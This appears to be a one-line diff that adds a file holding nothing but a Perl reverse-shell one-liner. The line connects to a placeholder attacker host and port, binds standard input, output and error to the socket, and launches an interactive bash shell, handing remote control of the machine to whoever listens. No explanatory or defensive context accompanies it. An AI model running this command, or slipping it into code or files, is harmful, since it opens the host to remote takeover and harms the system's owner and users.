@@ -1,0 +1,1 @@
+perl -e 'use Socket;$host="ATTACKER-IP";$port=ATTACKER-PORT;socket(Sock, PF_INET, SOCK_STREAM, getprotobyname("tcp"));if(connect(Sock, sockaddr_in($port, inet_aton($host)))){open(STDIN, ">&Sock");open(STDOUT, ">&Sock");open(STDERR, ">&Sock");exec("/bin/bash -i");};'
